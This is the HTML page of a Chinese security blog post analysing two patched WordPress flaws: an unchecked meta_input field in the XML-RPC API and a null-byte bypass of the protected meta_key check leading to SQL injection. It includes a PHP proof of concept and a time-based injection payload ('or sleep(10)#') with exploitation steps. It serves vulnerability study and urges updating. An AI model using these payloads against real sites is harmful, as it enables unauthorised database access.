@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>WordPress（4.8.2及以下版本） SQL注入利用漏洞 | ChaBug安全 | Www.ChaBug.Org</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="chabug,查bug,博客,寻找bug,初遇,chuyu,社区,Web,软件,分享,免费,安全" />
+  
+
+  <meta name="description" content="WordPress中的POST META为文章的自定义栏目/字段，就如一篇文章中会有标题、作者等字段，但是对于有些主题/插件来说，文章中的自有字段显得不够用，就需要用到自定义栏目/字段。 （该操作的位置在添加/编辑文章，在文本编辑框下方的自定义栏目，如果没有找到自定义栏目，需要在右上角的显示选项内将自定义栏目勾选。） 自定义栏目/字段的数据以meta_key（字段/栏目名）-&amp;gt;meta_va">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WordPress（4.8.2及以下版本） SQL注入利用漏洞">
+<meta property="og:url" content="http://www.chabug.org/2017/11/21/WordPress4-82-sql/index.html">
+<meta property="og:site_name" content="ChaBug安全 | Www.ChaBug.Org">
+<meta property="og:description" content="WordPress中的POST META为文章的自定义栏目/字段，就如一篇文章中会有标题、作者等字段，但是对于有些主题/插件来说，文章中的自有字段显得不够用，就需要用到自定义栏目/字段。 （该操作的位置在添加/编辑文章，在文本编辑框下方的自定义栏目，如果没有找到自定义栏目，需要在右上角的显示选项内将自定义栏目勾选。） 自定义栏目/字段的数据以meta_key（字段/栏目名）-&amp;gt;meta_va">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-11-21T07:56:18.954Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WordPress（4.8.2及以下版本） SQL注入利用漏洞">
+<meta name="twitter:description" content="WordPress中的POST META为文章的自定义栏目/字段，就如一篇文章中会有标题、作者等字段，但是对于有些主题/插件来说，文章中的自有字段显得不够用，就需要用到自定义栏目/字段。 （该操作的位置在添加/编辑文章，在文本编辑框下方的自定义栏目，如果没有找到自定义栏目，需要在右上角的显示选项内将自定义栏目勾选。） 自定义栏目/字段的数据以meta_key（字段/栏目名）-&amp;gt;meta_va">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e7d0b4f222c86066771d7246bd3dd18c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">菜单</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">菜单</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            归档
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#第一章-WordPress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞"><span class="toc-text">第一章 WordPress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-POC"><span class="toc-text">1.1 POC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-漏洞分析"><span class="toc-text">1.2 漏洞分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第二章-WordPress-≤-4-8-2-POST-META-校验绕过漏洞"><span class="toc-text">第二章 WordPress ≤ 4.8.2 POST META 校验绕过漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-一个MySQL的trick"><span class="toc-text">2.1 一个MySQL的trick</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-POST-META-校验绕过"><span class="toc-text">2.2 POST META 校验绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-POC"><span class="toc-text">2.3 POC</span></a></li></ol></li></ol></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-WordPress4-82-sql" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">WordPress（4.8.2及以下版本） SQL注入利用漏洞</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.11.21</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>初遇</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>WordPress中的<code>POST META</code>为文章的自定义栏目/字段，就如一篇文章中会有标题、作者等字段，但是对于有些主题/插件来说，文章中的自有字段显得不够用，就需要用到自定义栏目/字段。</p>
+<p>（该操作的位置在添加/编辑文章，在文本编辑框下方的自定义栏目，如果没有找到自定义栏目，需要在右上角的显示选项内将自定义栏目勾选。）</p>
+<p>自定义栏目/字段的数据以<code>meta_key</code>（字段/栏目名）-&gt;<code>meta_value</code>（值）的形式存放在wp_postmeta表内。以下划线开头的<code>meta_key</code>（字段/栏目名）被认为是保留字段，不允许用户添加。</p>
+<p>本文将介绍如何绕过Wordpress的<code>meta_key</code>检查，添加字段/栏目名以下划线开头的自定义栏目/字段。</p>
+<h1 id="第一章-WordPress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞"><a href="#第一章-WordPress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞" class="headerlink" title="第一章 WordPress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞"></a>第一章 WordPress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞</h1><p>参考内容：<a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/" target="_blank" rel="external">WordPress 4.7.5 Security and Maintenance Release</a></p>
+<h4 id="1-1-POC"><a href="#1-1-POC" class="headerlink" title="1.1 POC"></a>1.1 POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$usr = ‘author’;$pwd = ‘author’;$xmlrpc = ‘http://local.target/xmlrpc.php‘;$client = new IXR_Client($xmlrpc);$content = array(“ID” =&gt; 6, ‘meta_input’ =&gt; array(“_thumbnail_id”=&gt;”xxx”));$res = $client-&gt;query(‘wp.editPost’,0, $usr, $pwd, 6/post_id/, $content);</div></pre></td></tr></table></figure>
+<p>POC来自 <a href="https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e" target="_blank" rel="external">WordPress SQLi — PoC by slavco</a></p>
+<h4 id="1-2-漏洞分析"><a href="#1-2-漏洞分析" class="headerlink" title="1.2 漏洞分析"></a>1.2 漏洞分析</h4><p>补丁位置：<a href="https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4#diff-6a81e4b18bb9bfe1f02588ddc35d801b" target="_blank" rel="external"><code>wp-includes/class-wp-xmlrpc-server.php</code></a></p>
+
+<p>根据补丁的内容，是将传入的$content_struct内容进行了白名单限制，同时也过滤了POC中的<code>meta_input</code>。</p>
+<p>1.先看修复后的_insert_post函数中我们关注代码（文件：<a href="https://github.com/WordPress/WordPress/blob/e88a48a066ab2200ce3091b131d43e2fab2460a4/wp-includes/class-wp-xmlrpc-server.php#L1297" target="_blank" rel="external">wp-includes/class-wp-xmlrpc-server.php</a>）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">protected function _insert_post( $user, $content_struct ) &#123;</div><div class="line">    $defaults = array(</div><div class="line">        ...//ignore</div><div class="line">        &apos;custom_fields&apos;  =&gt; null,</div><div class="line">        &apos;terms_names&apos;    =&gt; null,</div><div class="line">        &apos;terms&apos;          =&gt; null,</div><div class="line">        &apos;sticky&apos;         =&gt; null,</div><div class="line">        &apos;enclosure&apos;      =&gt; null,</div><div class="line">        &apos;ID&apos;             =&gt; null,</div><div class="line">    );</div><div class="line">    $post_data = wp_parse_args( array_intersect_key( $content_struct, $defaults ), $defaults );</div><div class="line">    ...//ignore</div><div class="line">    if ( isset( $post_data[&apos;custom_fields&apos;] ) )</div><div class="line">        $this-&gt;set_custom_fields( $post_ID, $post_data[&apos;custom_fields&apos;] );</div><div class="line">    ...//ignore</div><div class="line">    $post_ID = $update ? wp_update_post( $post_data, true ) : wp_insert_post( $post_data, true );</div><div class="line">    if ( is_wp_error( $post_ID ) )</div><div class="line">        return new IXR_Error( 500, $post_ID-&gt;get_error_message() );</div><div class="line">    if ( ! $post_ID )</div><div class="line">        return new IXR_Error( 401, __( &apos;Sorry, your entry could not be posted.&apos; ) );</div><div class="line">    return strval( $post_ID );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>按正常的业务流程，POST META应当是从<code>custom_fields</code>中获取，之后带入<code>set_custom_fields</code>函数中，而且<code>set_custom_fields</code>函数会对<code>meta_key</code>进行检查，不应当存在问题。</p>
+<p>但是在wp_update_post函数与wp_insert_post函数中，会从<code>$post_data[&#39;meta_input&#39;]</code>中取出数据，不经检查直接添加到<code>自定义栏目/字段</code>中。</p>
+<p>2.函数wp_insert_post中我们关注的代码（文件：<a href="https://github.com/WordPress/WordPress/blob/9891448a421f495e3745356bab88ec985a0e64b8/wp-includes/post.php#L2974" target="_blank" rel="external">wp-includes/post.php</a>）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function wp_insert_post( $postarr, $wp_error = false ) &#123;</div><div class="line">    ...//ignore</div><div class="line">    $postarr = wp_parse_args($postarr, $defaults);</div><div class="line">    unset( $postarr[ &apos;filter&apos; ] );</div><div class="line">    $postarr = sanitize_post($postarr, &apos;db&apos;);</div><div class="line">    ...//ignore</div><div class="line">    if ( ! empty( $postarr[&apos;meta_input&apos;] ) ) &#123;</div><div class="line">        foreach ( $postarr[&apos;meta_input&apos;] as $field =&gt; $value ) &#123;</div><div class="line">            update_post_meta( $post_ID, $field, $value );</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    ...//ignore</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="第二章-WordPress-≤-4-8-2-POST-META-校验绕过漏洞"><a href="#第二章-WordPress-≤-4-8-2-POST-META-校验绕过漏洞" class="headerlink" title="第二章 WordPress ≤ 4.8.2 POST META 校验绕过漏洞"></a>第二章 WordPress ≤ 4.8.2 POST META 校验绕过漏洞</h1><p>WordPress目前最新版为4.8.3，建议大家更新。</p>
+<h4 id="2-1-一个MySQL的trick"><a href="#2-1-一个MySQL的trick" class="headerlink" title="2.1 一个MySQL的trick"></a>2.1 一个MySQL的trick</h4><p>1). 正常的条件查询语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 | _thumbnail_id  | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<p>2). 现在我们将<code>_thumbnail_id</code>修改成<code>”\x00_thumbnail_id”</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; update wp_postmeta set meta_key = concat(0x00,&apos;TESTC&apos;) where meta_value = &apos;_thumbnail_id&apos;;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div><div class="line">Rows matched: 0  Changed: 0  Warnings: 0</div></pre></td></tr></table></figure></p>
+<p>3). 再次执行第一步的查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 |  _thumbnail_id | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<p>我们可以发现依然可以查询出修改后的数据。</p>
+<h4 id="2-2-POST-META-校验绕过"><a href="#2-2-POST-META-校验绕过" class="headerlink" title="2.2 POST META 校验绕过"></a>2.2 POST META 校验绕过</h4><p>我们来看下检查<code>meta_key</code>的代码，文件<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L920" target="_blank" rel="external">./wp-includes/meta.php</a>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">function is_protected_meta( $meta_key, $meta_type = null ) &#123;</div><div class="line">    $protected = ( &apos;_&apos; == $meta_key[0] );</div><div class="line"></div><div class="line">    /**</div><div class="line">     * Filters whether a meta key is protected.</div><div class="line">     *</div><div class="line">     * [@since](/since) 3.2.0</div><div class="line">     *</div><div class="line">     * [@param](/param) bool   $protected Whether the key is protected. Default false.</div><div class="line">     * [@param](/param) string $meta_key  Meta key.</div><div class="line">     * [@param](/param) string $meta_type Meta type.</div><div class="line">     */</div><div class="line">    return apply_filters( &apos;is_protected_meta&apos;, $protected, $meta_key, $meta_type );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>is_protected_meta函数只检查了$meta<em>key的第一个字符是否以</em>开头。我们有了2.1的MySQL trick，想要绕过meta_key的检查就显得容易多了。</p>
+<h4 id="2-3-POC"><a href="#2-3-POC" class="headerlink" title="2.3 POC"></a>2.3 POC</h4><p>添加自定义字段，meta_key为<code>’_thumbnail_id’</code>的meta_value为<code>’55 %1$%s or sleep(10)#’</code><br>在添加自定义栏目/字段时抓包，将<code>_thumbnail_id</code>替换为<code>%00_thumbnail_id</code><br>访问<code>/wp-admin/edit.php?action=delete&amp;_wpnonce=xxx&amp;ids=55 %1$%s or sleep(10)#</code>，触发SQL注入漏洞<br>参考</p>
+<p>WordPress 4.7.5 Security and Maintenance Release – <a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/" target="_blank" rel="external">https://wordpress.org/news/2017/05/wordpress-4-7-5/</a></p>
+<p>WordPress SQLi — PoC by slavco – <a href="https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e" target="_blank" rel="external">https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e</a></p>
+<p>WordPress post meta data checks bypass – <a href="https://hackerone.com/reports/265484" target="_blank" rel="external">https://hackerone.com/reports/265484</a></p>
+<p>WordPress &lt;= 4.8.2 SQL Injection POC – <a href="http://blog.vulspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" target="_blank" rel="external">http://blog.vulspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/</a></p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持我们</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/11/18/win10-Professional-key/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              归档
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+
+
+
+    
+
+    
+
+    
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
+    <div id="comment" class="vcomment" ></div>
+    <script>
+        var notify = 'true' == true ? true : false;
+        var verify = 'true' == true ? true : false;
+        var GUEST_INFO = ['nick','mail','link'];
+        var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+            return GUEST_INFO.indexOf(item) > -1
+        });
+        guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+        window.valine = new Valine({
+            el: '.vcomment',
+            notify: notify,
+            verify: verify,
+            appId: "AJkm1H6pqaOJj8Ri0diaiC1B-gzGzoHsz",
+            appKey: "C7iKty624EOzxxwH1pXfuXL9",
+            avatar:'mm',
+            placeholder: "看完了?来吐槽啊!记得正确填写邮箱,有回复会邮件通知你哦٩(๑❛ᴗ❛๑)۶",
+            guest_info:guest_info,
+            pageSize:'10'
+        });
+    </script>
+  
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
